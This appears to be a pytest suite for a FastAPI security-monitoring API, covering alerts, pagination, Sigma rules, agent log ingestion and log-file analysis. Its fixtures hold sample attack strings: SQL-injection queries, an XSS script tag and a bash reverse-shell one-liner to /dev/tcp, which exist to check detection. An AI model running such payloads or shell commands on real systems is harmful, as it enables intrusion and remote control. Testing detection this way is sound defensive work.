"""
Tests for the FastAPI REST API — all endpoints, filtering, pagination,
agent ingestion, log file analysis, and monitor control.
"""

import io
import json
import sqlite3
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
from datetime import datetime


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _insert_alert(db_path, **overrides):
    """Directly insert a test alert into the isolated DB."""
    defaults = {
        "timestamp": datetime.now().isoformat(),
        "event_type": "SQL_INJECTION_ATTEMPT",
        "severity": "CRITICAL",
        "source_ip": "10.0.0.1",
        "description": "SQL injection detected",
        "raw_log": "GET /search?q=1 UNION SELECT * FROM users--",
        "matched_keywords": json.dumps(["union select"]),
        "false_positives": json.dumps(["Legitimate DB admin"]),
        "mitre_tactics": json.dumps(["Initial Access"]),
        "mitre_techniques": json.dumps(["T1190"]),
        "sigma_rule_id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
        "sigma_rule_title": "SQL Injection Attempt",
    }
    defaults.update(overrides)
    conn = sqlite3.connect(str(db_path))
    conn.execute("""
        INSERT INTO alerts (timestamp, event_type, severity, source_ip, description,
            raw_log, matched_keywords, false_positives, mitre_tactics, mitre_techniques,
            sigma_rule_id, sigma_rule_title)
        VALUES (:timestamp, :event_type, :severity, :source_ip, :description,
            :raw_log, :matched_keywords, :false_positives, :mitre_tactics, :mitre_techniques,
            :sigma_rule_id, :sigma_rule_title)
    """, defaults)
    conn.commit()
    conn.close()


# ─────────────────────────────────────────────────────────────────────────────
# Root redirect
# ─────────────────────────────────────────────────────────────────────────────

class TestRoot:
    def test_root_redirects_to_docs(self, api_client):
        resp = api_client.get("/", follow_redirects=False)
        assert resp.status_code in (301, 302, 307, 308)
        assert "/docs" in resp.headers.get("location", "")


# ─────────────────────────────────────────────────────────────────────────────
# /api/stats
# ─────────────────────────────────────────────────────────────────────────────

class TestStatsEndpoint:
    def test_stats_returns_200(self, api_client):
        resp = api_client.get("/api/stats")
        assert resp.status_code == 200

    def test_stats_structure(self, api_client):
        resp = api_client.get("/api/stats")
        data = resp.json()
        assert "total_alerts" in data
        assert "alerts_last_hour" in data
        assert "by_severity" in data
        assert "by_type" in data
        assert "top_ips" in data

    def test_stats_empty_db(self, api_client):
        resp = api_client.get("/api/stats")
        data = resp.json()
        assert data["total_alerts"] == 0

    def test_stats_counts_after_insert(self, api_client, tmp_path):
        import api as api_module
        _insert_alert(api_module.DB_PATH)
        resp = api_client.get("/api/stats")
        data = resp.json()
        assert data["total_alerts"] >= 1


# ─────────────────────────────────────────────────────────────────────────────
# /api/alerts
# ─────────────────────────────────────────────────────────────────────────────

class TestAlertsEndpoint:
    def test_alerts_returns_200(self, api_client):
        resp = api_client.get("/api/alerts")
        assert resp.status_code == 200

    def test_alerts_structure(self, api_client):
        resp = api_client.get("/api/alerts")
        data = resp.json()
        assert "total" in data
        assert "page" in data
        assert "limit" in data
        assert "pages" in data
        assert "alerts" in data
        assert isinstance(data["alerts"], list)

    def test_alerts_empty_db(self, api_client):
        resp = api_client.get("/api/alerts")
        data = resp.json()
        assert data["total"] == 0
        assert data["alerts"] == []

    def test_alerts_pagination_default(self, api_client):
        import api as api_module
        for i in range(5):
            _insert_alert(api_module.DB_PATH, source_ip=f"10.0.0.{i}")
        resp = api_client.get("/api/alerts")
        data = resp.json()
        assert data["total"] == 5
        assert len(data["alerts"]) == 5

    def test_alerts_pagination_limit(self, api_client):
        import api as api_module
        for i in range(10):
            _insert_alert(api_module.DB_PATH, source_ip=f"10.0.0.{i}")
        resp = api_client.get("/api/alerts?limit=3&page=1")
        data = resp.json()
        assert len(data["alerts"]) == 3
        assert data["pages"] >= 3

    def test_alerts_pagination_page2(self, api_client):
        import api as api_module
        for i in range(6):
            _insert_alert(api_module.DB_PATH, source_ip=f"10.0.0.{i}")
        p1 = api_client.get("/api/alerts?limit=3&page=1").json()
        p2 = api_client.get("/api/alerts?limit=3&page=2").json()
        ids1 = {a["id"] for a in p1["alerts"]}
        ids2 = {a["id"] for a in p2["alerts"]}
        assert ids1.isdisjoint(ids2)

    def test_alerts_filter_severity(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH, severity="CRITICAL")
        _insert_alert(api_module.DB_PATH, severity="WARNING")
        resp = api_client.get("/api/alerts?severity=CRITICAL")
        data = resp.json()
        assert all(a["severity"] == "CRITICAL" for a in data["alerts"])

    def test_alerts_filter_event_type(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH, event_type="SQL_INJECTION_ATTEMPT")
        _insert_alert(api_module.DB_PATH, event_type="XSS_ATTEMPT")
        resp = api_client.get("/api/alerts?event_type=SQL_INJECTION_ATTEMPT")
        data = resp.json()
        assert all(a["event_type"] == "SQL_INJECTION_ATTEMPT" for a in data["alerts"])

    def test_alerts_filter_source_ip(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH, source_ip="192.168.1.50")
        _insert_alert(api_module.DB_PATH, source_ip="10.0.0.1")
        resp = api_client.get("/api/alerts?source_ip=192.168.1.50")
        data = resp.json()
        assert all("192.168.1.50" in a["source_ip"] for a in data["alerts"])

    def test_alerts_filter_search(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH, description="unique_xyz_term")
        _insert_alert(api_module.DB_PATH, description="normal description")
        resp = api_client.get("/api/alerts?search=unique_xyz_term")
        data = resp.json()
        assert data["total"] >= 1
        assert all("unique_xyz_term" in a["description"] for a in data["alerts"])

    def test_alerts_json_fields_deserialized(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH)
        resp = api_client.get("/api/alerts")
        data = resp.json()
        a = data["alerts"][0]
        assert isinstance(a["matched_keywords"], list)
        assert isinstance(a["mitre_tactics"], list)
        assert isinstance(a["mitre_techniques"], list)

    def test_alerts_invalid_page_rejected(self, api_client):
        resp = api_client.get("/api/alerts?page=0")
        assert resp.status_code == 422

    def test_alerts_limit_too_large_rejected(self, api_client):
        resp = api_client.get("/api/alerts?limit=999")
        assert resp.status_code == 422


# ─────────────────────────────────────────────────────────────────────────────
# /api/alerts/recent
# ─────────────────────────────────────────────────────────────────────────────

class TestRecentAlertsEndpoint:
    def test_recent_returns_200(self, api_client):
        resp = api_client.get("/api/alerts/recent")
        assert resp.status_code == 200

    def test_recent_returns_list(self, api_client):
        resp = api_client.get("/api/alerts/recent")
        assert isinstance(resp.json(), list)

    def test_recent_respects_n_param(self, api_client):
        import api as api_module
        for i in range(10):
            _insert_alert(api_module.DB_PATH, source_ip=f"10.0.0.{i}")
        resp = api_client.get("/api/alerts/recent?n=3")
        assert len(resp.json()) == 3

    def test_recent_n_too_large_rejected(self, api_client):
        resp = api_client.get("/api/alerts/recent?n=999")
        assert resp.status_code == 422


# ─────────────────────────────────────────────────────────────────────────────
# /api/live-logs
# ─────────────────────────────────────────────────────────────────────────────

class TestLiveLogsEndpoint:
    def test_live_logs_returns_200(self, api_client):
        resp = api_client.get("/api/live-logs")
        assert resp.status_code == 200

    def test_live_logs_returns_list(self, api_client):
        resp = api_client.get("/api/live-logs")
        assert isinstance(resp.json(), list)

    def test_live_logs_n_param(self, api_client):
        resp = api_client.get("/api/live-logs?n=10")
        assert resp.status_code == 200


# ─────────────────────────────────────────────────────────────────────────────
# /api/attacks/timeline
# ─────────────────────────────────────────────────────────────────────────────

class TestTimelineEndpoint:
    def test_timeline_returns_200(self, api_client):
        resp = api_client.get("/api/attacks/timeline")
        assert resp.status_code == 200

    def test_timeline_returns_list(self, api_client):
        resp = api_client.get("/api/attacks/timeline")
        assert isinstance(resp.json(), list)

    def test_timeline_entry_structure(self, api_client):
        import api as api_module
        _insert_alert(api_module.DB_PATH)
        resp = api_client.get("/api/attacks/timeline")
        data = resp.json()
        if data:
            assert "hour" in data[0]
            assert "count" in data[0]


# ─────────────────────────────────────────────────────────────────────────────
# /api/status
# ─────────────────────────────────────────────────────────────────────────────

class TestStatusEndpoint:
    def test_status_returns_200(self, api_client):
        resp = api_client.get("/api/status")
        assert resp.status_code == 200

    def test_status_structure(self, api_client):
        resp = api_client.get("/api/status")
        data = resp.json()
        assert "monitoring" in data
        assert "db_exists" in data

    def test_status_monitoring_false_initially(self, api_client):
        resp = api_client.get("/api/status")
        assert resp.json()["monitoring"] is False


# ─────────────────────────────────────────────────────────────────────────────
# /api/sigma/rules
# ─────────────────────────────────────────────────────────────────────────────

class TestSigmaRulesEndpoint:
    def test_sigma_rules_returns_200(self, api_client):
        resp = api_client.get("/api/sigma/rules")
        assert resp.status_code == 200

    def test_sigma_rules_structure(self, api_client):
        resp = api_client.get("/api/sigma/rules")
        data = resp.json()
        assert "count" in data
        assert "rules" in data
        assert isinstance(data["rules"], list)

    def test_sigma_rules_count_matches_list(self, api_client):
        resp = api_client.get("/api/sigma/rules")
        data = resp.json()
        assert data["count"] == len(data["rules"])

    def test_sigma_rules_at_least_60(self, api_client):
        resp = api_client.get("/api/sigma/rules")
        data = resp.json()
        assert data["count"] >= 60


# ─────────────────────────────────────────────────────────────────────────────
# /api/control/start and /api/control/stop
# ─────────────────────────────────────────────────────────────────────────────

class TestMonitorControl:
    def test_stop_when_not_running(self, api_client):
        resp = api_client.post("/api/control/stop")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "not_running"

    def test_start_monitor(self, api_client):
        mock_proc = MagicMock()
        mock_proc.poll.return_value = None
        with patch("subprocess.Popen", return_value=mock_proc):
            resp = api_client.post("/api/control/start")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "started"

    def test_start_already_running(self, api_client):
        import api as api_module
        mock_proc = MagicMock()
        mock_proc.poll.return_value = None
        api_module._monitor_proc = mock_proc
        resp = api_client.post("/api/control/start")
        assert resp.status_code == 200
        assert resp.json()["status"] == "already_running"
        api_module._monitor_proc = None

    def test_stop_running_monitor(self, api_client):
        import api as api_module
        mock_proc = MagicMock()
        mock_proc.poll.return_value = None
        api_module._monitor_proc = mock_proc
        resp = api_client.post("/api/control/stop")
        assert resp.status_code == 200
        assert resp.json()["status"] == "stopped"
        assert api_module._monitor_proc is None


# ─────────────────────────────────────────────────────────────────────────────
# /api/agent/register and /api/agent/list
# ─────────────────────────────────────────────────────────────────────────────

class TestAgentEndpoints:
    def test_agent_list_empty(self, api_client):
        resp = api_client.get("/api/agent/list")
        assert resp.status_code == 200
        data = resp.json()
        assert "agents" in data

    def test_agent_register(self, api_client):
        payload = {
            "agent_id": "test-agent-001",
            "hostname": "test-host",
            "metadata": {"os": "linux"},
        }
        resp = api_client.post("/api/agent/register", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "registered"
        assert data["agent_id"] == "test-agent-001"

    def test_agent_register_then_list(self, api_client):
        payload = {
            "agent_id": "test-agent-002",
            "hostname": "test-host-2",
        }
        api_client.post("/api/agent/register", json=payload)
        resp = api_client.get("/api/agent/list")
        data = resp.json()
        agent_ids = [a["agent_id"] for a in data["agents"]]
        assert "test-agent-002" in agent_ids

    def test_agent_live_logs_empty(self, api_client):
        resp = api_client.get("/api/agent/live")
        assert resp.status_code == 200
        data = resp.json()
        assert "logs" in data
        assert "count" in data


# ─────────────────────────────────────────────────────────────────────────────
# /api/agent/ingest
# ─────────────────────────────────────────────────────────────────────────────

class TestAgentIngest:
    def _make_ingest_payload(self, messages):
        return {
            "agent_id": "test-agent-ingest",
            "hostname": "test-host",
            "timestamp": datetime.now().isoformat(),
            "logs": [
                {
                    "timestamp": datetime.now().isoformat(),
                    "hostname": "test-host",
                    "source": "sshd",
                    "message": msg,
                    "raw": msg,
                }
                for msg in messages
            ],
        }

    def test_ingest_benign_logs(self, api_client):
        payload = self._make_ingest_payload([
            "CRON[1234]: (root) CMD (/usr/bin/backup.sh)",
            "systemd: Started Daily apt upgrade and clean activities.",
        ])
        resp = api_client.post("/api/agent/ingest", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["logs_processed"] == 2
        assert data["alerts_created"] == 0

    def test_ingest_malicious_log_creates_alert(self, api_client):
        payload = self._make_ingest_payload([
            "sshd: Failed password for root from 10.0.0.1 port 22",
        ])
        resp = api_client.post("/api/agent/ingest", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["logs_processed"] == 1

    def test_ingest_empty_logs(self, api_client):
        payload = self._make_ingest_payload([])
        resp = api_client.post("/api/agent/ingest", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        assert data["logs_processed"] == 0

    def test_ingest_updates_agent_status(self, api_client):
        payload = self._make_ingest_payload(["benign log line"])
        api_client.post("/api/agent/ingest", json=payload)
        resp = api_client.get("/api/agent/list")
        agent_ids = [a["agent_id"] for a in resp.json()["agents"]]
        assert "test-agent-ingest" in agent_ids

    def test_ingest_response_structure(self, api_client):
        payload = self._make_ingest_payload(["test log"])
        resp = api_client.post("/api/agent/ingest", json=payload)
        data = resp.json()
        assert "status" in data
        assert "logs_processed" in data
        assert "alerts_created" in data
        assert "agent_id" in data


# ─────────────────────────────────────────────────────────────────────────────
# /api/analyze (log file upload)
# ─────────────────────────────────────────────────────────────────────────────

class TestLogFileAnalysis:
    def test_analyze_benign_file(self, api_client):
        content = b"CRON[1234]: (root) CMD (/usr/bin/backup.sh)\nsystemd: Started service.\n"
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("test.log", io.BytesIO(content), "text/plain")},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["lines_processed"] == 2
        assert data["alerts_found"] == 0

    def test_analyze_malicious_file(self, api_client):
        content = (
            b"GET /search?q=1 UNION SELECT username,password FROM users--\n"
            b"GET /search?q=<script>alert(1)</script>\n"
            b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        )
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("attack.log", io.BytesIO(content), "text/plain")},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["lines_processed"] == 3
        assert data["alerts_found"] >= 2

    def test_analyze_response_structure(self, api_client):
        content = b"GET /search?q=1 UNION SELECT * FROM users--\n"
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("test.log", io.BytesIO(content), "text/plain")},
        )
        data = resp.json()
        required = {
            "filename", "lines_processed", "alerts_found",
            "by_type", "by_severity", "by_tactic", "by_technique", "alerts",
        }
        assert required.issubset(data.keys())

    def test_analyze_empty_file(self, api_client):
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("empty.log", io.BytesIO(b""), "text/plain")},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["lines_processed"] == 0
        assert data["alerts_found"] == 0

    def test_analyze_file_with_blank_lines(self, api_client):
        content = b"\n\n\nGET /search?q=1 UNION SELECT * FROM users--\n\n"
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("test.log", io.BytesIO(content), "text/plain")},
        )
        data = resp.json()
        assert data["lines_processed"] == 1

    def test_analyze_mitre_breakdown(self, api_client):
        content = b"GET /search?q=1 UNION SELECT * FROM users--\n"
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("test.log", io.BytesIO(content), "text/plain")},
        )
        data = resp.json()
        assert isinstance(data["by_tactic"], list)
        assert isinstance(data["by_technique"], list)
        if data["alerts_found"] > 0:
            assert len(data["by_tactic"]) > 0

    def test_analyze_alert_saved_to_db(self, api_client):
        """Alerts found during analysis are returned in the response."""
        content = b"GET /search?q=1 UNION SELECT * FROM users--\n"
        resp = api_client.post(
            "/api/analyze",
            files={"file": ("test.log", io.BytesIO(content), "text/plain")},
        )
        data = resp.json()
        # The response itself must report at least one alert found
        assert data["alerts_found"] >= 1
        assert len(data["alerts"]) >= 1
